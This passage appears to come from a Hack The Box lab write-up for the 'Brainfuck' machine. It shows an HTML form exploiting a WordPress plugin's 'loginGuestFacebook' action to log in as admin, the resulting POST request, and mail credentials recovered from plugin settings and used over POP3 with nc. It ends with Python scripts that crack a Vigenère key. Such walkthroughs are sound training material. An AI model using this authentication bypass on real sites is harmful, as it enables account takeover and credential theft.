+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginGuestFacebook<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/a46d7d1a6c5e4da0be94b2d55a403545" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Opening the exploit simply shows a form asking for a username and a login button. I entered </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString">, and clicked Login.</span></span></p></div><div id="https://www.notion.so/457e4be43bad4d35ad9bca48342d507b" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F19a5a628-b6e6-459a-9114-77fefe76d68b%2FUntitled.png?width=726&amp;table=block&amp;id=457e4be4-3bad-4d35-ad9b-ca48342d507b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F19a5a628-b6e6-459a-9114-77fefe76d68b%2FUntitled.png?width=726&amp;table=block&amp;id=457e4be4-3bad-4d35-ad9b-ca48342d507b" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/51fdadcfcd7e40cdb7176c5d2b359209" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It sent a POST request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/wp-admin/admin-ajax.php</code></span><span class="SemanticString"> with the username and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">loginGuestFacebook</code></span><span class="SemanticString"> as the POST data.</span></span></p></div><pre id="https://www.notion.so/b9a17a811ec84b6cb258da84e64fbdcd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: brainfuck.htb
+Content-Length: 50
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Linux&quot;
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username=admin&amp;email=sth&amp;action=loginGuestFacebook</span></span></span></code></pre><div id="https://www.notion.so/48c5ccc0e3d94ab7bcc15059389121db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I reloaded the WordPress page, and I’m now logged in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/72ab646cb471414ca38d395c1c4cf466" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffaed973b-d63e-45b8-9b47-3ee51da3c7d6%2FUntitled.png?width=1898&amp;table=block&amp;id=72ab646c-b471-414c-a38d-395c1c4cf466"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffaed973b-d63e-45b8-9b47-3ee51da3c7d6%2FUntitled.png?width=1898&amp;table=block&amp;id=72ab646c-b471-414c-a38d-395c1c4cf466" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6b93ece207a14894bdf01fdbd913f185" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The admin dashboard can also be accessed.</span></span></p></div><div id="https://www.notion.so/097ffdaf69c64b67a46d6ad00cffc159" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fac0f8b5f-22b9-48c9-9d12-da84c9c6565e%2FUntitled.png?width=1918&amp;table=block&amp;id=097ffdaf-69c6-4b67-a46d-6ad00cffc159"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fac0f8b5f-22b9-48c9-9d12-da84c9c6565e%2FUntitled.png?width=1918&amp;table=block&amp;id=097ffdaf-69c6-4b67-a46d-6ad00cffc159" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/52b13e5241d4473a8637239a5f69c855" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once admin access is gained, a typical exploit chain is to edit the WordPress theme’s PHP files and smuggle in a web shell (see </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce">this HackTricks page</a></span><span class="SemanticString"> for more details). However it won’t work here as all the PHP files are configured to be read-only on the server.</span></span></p></div><div id="https://www.notion.so/831f665564ad451192a1a7dce05ef54e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I also tried uploading a plugin, but it resulted in similar errors due to the file permission settings. However, I noticed there’s already 4 plugin installed, one of which relates to SMTP.</span></span></p></div><div id="https://www.notion.so/9c7f481159a44b99b7e91da8aa506220" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F713582ed-cc9e-49fb-a357-ac7e528e2719%2FUntitled.png?width=1731&amp;table=block&amp;id=9c7f4811-59a4-4b99-b7e9-1da8aa506220"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F713582ed-cc9e-49fb-a357-ac7e528e2719%2FUntitled.png?width=1731&amp;table=block&amp;id=9c7f4811-59a4-4b99-b7e9-1da8aa506220" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/664b1e33500e4121a7581ab20ea40a52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I checked its settings, and it contains credentials for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">. </span></span></p></div><div id="https://www.notion.so/eaa7495473464a53b52ab239dd9bd619" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F69736389-6377-4b0c-9bb1-4e9784551449%2FUntitled.png?width=1563&amp;table=block&amp;id=eaa74954-7346-4a53-b52a-b239dd9bd619"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F69736389-6377-4b0c-9bb1-4e9784551449%2FUntitled.png?width=1563&amp;table=block&amp;id=eaa74954-7346-4a53-b52a-b239dd9bd619" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4d9ed93ab7d94f929074c8f3440e82ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Although the password is masked, its plaintext value can be retrieved by inspecting the source.</span></span></p></div><div id="https://www.notion.so/9f2cdcd4d4504b8f87fbf4260106fa68" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe314a26b-3aec-4732-b411-be89abc306de%2FUntitled.png?width=623&amp;table=block&amp;id=9f2cdcd4-d450-4b8f-87fb-f4260106fa68"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe314a26b-3aec-4732-b411-be89abc306de%2FUntitled.png?width=623&amp;table=block&amp;id=9f2cdcd4-d450-4b8f-87fb-f4260106fa68" style="width:623px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2bf98e3a8ed04fa88e4c1f98b60ec873" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ce4c880b327c469ab312e6256c3df018" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP110 — POP3:</strong></span></span></p></div><div id="https://www.notion.so/d88b56585e674275b2b7aba0dc9a18b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop">This HackTricks page</a></span><span class="SemanticString"> provides a nice guide on how to interact with a mail server. An email client such as Thunderbird can be used to connect to the server, but the easiest way to do so is via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/28121241ef144fcd9a9eb93791e9b5ef" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> nc brainfuck.htb 110
+
++OK Dovecot ready.
+
+USER orestis
++OK
+
+PASS kHGuERB29DNiNE
++OK Logged in.</span></span></span></code></pre><div id="https://www.notion.so/a899c193f3504170aef5738a79da7495" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s two mails in this mailbox.</span></span></p></div><pre id="https://www.notion.so/09a191956b374f6c8b8da1de92d276db" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>list
++OK 2 messages:
+1 977
+2 514
+</span></span></span></code></pre><div id="https://www.notion.so/133de23be60948f6bf4f4b1b793f73e1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The first mail is just the default email received when setting up a WordPress site, nothing interesting found here.</span></span></p></div><pre id="https://www.notion.so/0399d4196e184171bb6b4b560744eceb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>retr 1
++OK 977 octets
+Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/</span></span></span></code></pre><div id="https://www.notion.so/13ae20f3082c409ca7d8e48489110603" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the second one is from the secret forum, and contains another set of credentials for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/488db63e11534d44b5732dd70c401b45" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>retr 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our &quot;secret&quot; forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards</span></span></span></code></pre><div id="https://www.notion.so/dec3c46569b4464da2b962f3b339d3bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a494c55998b6414cb6dcf1b31df081b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Secret Forum:</strong></span></span></p></div><div id="https://www.notion.so/ba5753a3567145b5adddc0b0591c7f30" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the new set of credentials, I can now log in to the secret forum as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">. There’s two more threads found here.</span></span></p></div><div id="https://www.notion.so/ea31202ea5ee499e9e19c2115b944638" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa1116aa3-a064-428b-a9cd-6fd2356d485e%2FUntitled.png?width=1249&amp;table=block&amp;id=ea31202e-a5ee-499e-9e19-c2115b944638"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa1116aa3-a064-428b-a9cd-6fd2356d485e%2FUntitled.png?width=1249&amp;table=block&amp;id=ea31202e-a5ee-499e-9e19-c2115b944638" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0e897170dfdb4746b71b4defbbc2f535" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll check “SSH Access” first:</span></span></p></div><div id="https://www.notion.so/ef57cc9b28064418bfdbdbef4f5f15c5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F87b7ad5c-34a2-4032-b772-15cf20ac6256%2FUntitled.png?width=1269&amp;table=block&amp;id=ef57cc9b-2806-4418-bfdb-dbef4f5f15c5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F87b7ad5c-34a2-4032-b772-15cf20ac6256%2FUntitled.png?width=1269&amp;table=block&amp;id=ef57cc9b-2806-4418-bfdb-dbef4f5f15c5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/38d34f65605d42d68f2d27757d0c4e56" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s a pretty savage conversation between </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString">, and mentioned that SSH now only accepts key-based authentication. It’s also worth noting that all of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">&#x27; messages ends with “Orestis - Hacking for fun and profit”.</span></span></p></div><div id="https://www.notion.so/e4a7f910b3164f9eb0af48aeca70d8ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on their conversation, the second thread should contain information about the SSH key, but all messages are encrypted.</span></span></p></div><div id="https://www.notion.so/c24b46561e464787b7cf3e24ddd35aa0" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc9abc3ba-8b36-406b-8dae-e2210ae446d1%2FUntitled.png?width=1324&amp;table=block&amp;id=c24b4656-1e46-4787-b7cf-3e24ddd35aa0"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc9abc3ba-8b36-406b-8dae-e2210ae446d1%2FUntitled.png?width=1324&amp;table=block&amp;id=c24b4656-1e46-4787-b7cf-3e24ddd35aa0" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/7ea3ad856d5f41a88fdb52ee8987e22b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Notice that all of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">&#x27; messages end with 6 words, each time the same length. I’m guessing those are the encrypted version of his signature “Orestis - hacking for fun and profit”. This is likely a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenere cipher</a></span><span class="SemanticString">, which essentially loops over the key and shifts each letter of the plaintext based on the key character.</span></span></p></div><div id="https://www.notion.so/e612bad03f31422e807dd5b681368059" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m not good at explaining cryptography, so here’s a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.geeksforgeeks.org/vigenere-cipher/">page</a></span><span class="SemanticString"> that describes the algorithm in more details and with several examples.</span></span></p></div><div id="https://www.notion.so/822d9224c00b442da2638b076dfd65b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3afa391662e14251aecdc34fc9b430b4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Breaking Vigenere Cipher:</strong></span></span></p></div><div id="https://www.notion.so/50071566cb814b9f8eee84055dc39321" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since the ciphertext and part of the plaintext are known, it’s possible to extract the encryption key by comparing each letter of the plaintext with the corresponding letter of the ciphertext. I’ll do this with a Python script:</span></span></p></div><pre id="https://www.notion.so/59c83bb56c8448b498bc4663844a01ad" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">crack</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> enc<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    chars <span class="token operator">=</span> <span class="token string">"abcdefg"</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"pt : </span><span class="token interpolation"><span class="token punctuation">{</span>pt<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"enc: </span><span class="token interpolation"><span class="token punctuation">{</span>enc<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token comment"># enc = pt + key (mod 26)</span>
+    <span class="token comment"># key = enc - pt (mod 26)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> pt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>pt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token comment"># ignore whitespace</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    orig <span class="token operator">=</span> <span class="token string">"Orestis - Hacking for fun and profit"</span>
+
+    enc1 <span class="token operator">=</span> <span class="token string">"Pieagnm - Jkoijeg nbw zwx mle grwsnn"</span>
+    enc2 <span class="token operator">=</span> <span class="token string">"Wejmvse - Fbtkqal zqb rso rnl cwihsf"</span>
+    enc3 <span class="token operator">=</span> <span class="token string">"Qbqquzs - Pnhekxs dpi fca fhf zdmgzt"</span>
+
+    crack<span class="token punctuation">(</span>orig<span class="token punctuation">,</span> enc1<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    crack<span class="token punctuation">(</span>orig<span class="token punctuation">,</span> enc2<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    crack<span class="token punctuation">(</span>orig<span class="token punctuation">,</span> enc3<span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+
+main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/060eece6b9bc41a38842883defad4825" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">and the key is likely </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">fuckmybrain</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/3ee6af5fbad8401ca8454ab41f1c054d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> python crack.py   
+
+pt : Orestis - Hacking for fun and profit
+enc: Pieagnm - Jkoijeg nbw zwx mle grwsnn
+key: brainfu   ckmybra inf uck myb rainfu
+
+pt : Orestis - Hacking for fun and profit
+enc: Wejmvse - Fbtkqal zqb rso rnl cwihsf
+key: infuckm   ybrainf uck myb rai nfuckm
+
+pt : Orestis - Hacking for fun and profit
+enc: Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
+key: ckmybra   infuckm ybr ain fuc kmybra</span></span></span></code></pre><div id="https://www.notion.so/9d0ca0bb309a429cb9bfe16e3a0cdd3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the key, I can decrypt all the messages. The GeeksforGeeks page linked above contains a Python decrypt function, which I modified slightly to make it print out all the decrypted messages. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://decode.fr">decode.fr</a></span><span class="SemanticString"> also has a Vigenere decoding page. </span></span></p></div><pre id="https://www.notion.so/7c3762ec2dad49fcbf0bebb47c18c264" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    keylen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    index <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># pt = enc - key (mod 26)</span>
+            k <span class="token operator">=</span> index <span class="token operator">%</span> keylen
+            pt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
+            pt <span class="token operator">+=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
